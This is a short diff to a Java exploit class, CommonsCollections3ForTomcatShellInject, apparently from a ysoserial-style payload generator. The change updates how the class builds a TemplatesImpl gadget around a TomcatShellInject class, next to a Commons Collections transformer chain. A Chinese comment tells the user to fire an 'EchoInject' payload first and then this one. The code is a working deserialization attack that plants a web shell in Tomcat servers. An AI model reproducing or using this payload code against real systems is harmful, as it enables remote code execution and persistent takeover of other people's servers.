@@ -30,7 +30,7 @@ public class CommonsCollections3ForTomcatShellInject extends PayloadRunner imple
 
 	public Object getObject(final String ... command) throws Exception {
         //todo 需要先使用 CommonsCollections3ForTomcatEchoInject 打一遍，再用这个打
-		Object templatesImpl = Gadgets.createTemplatesImpl(null, TomcatShellInject.class);
+		Object templatesImpl = Gadgets.createTemplatesImpl(TomcatShellInject.class);
 
 		// inert chain for setup
 		final Transformer transformerChain = new ChainedTransformer(
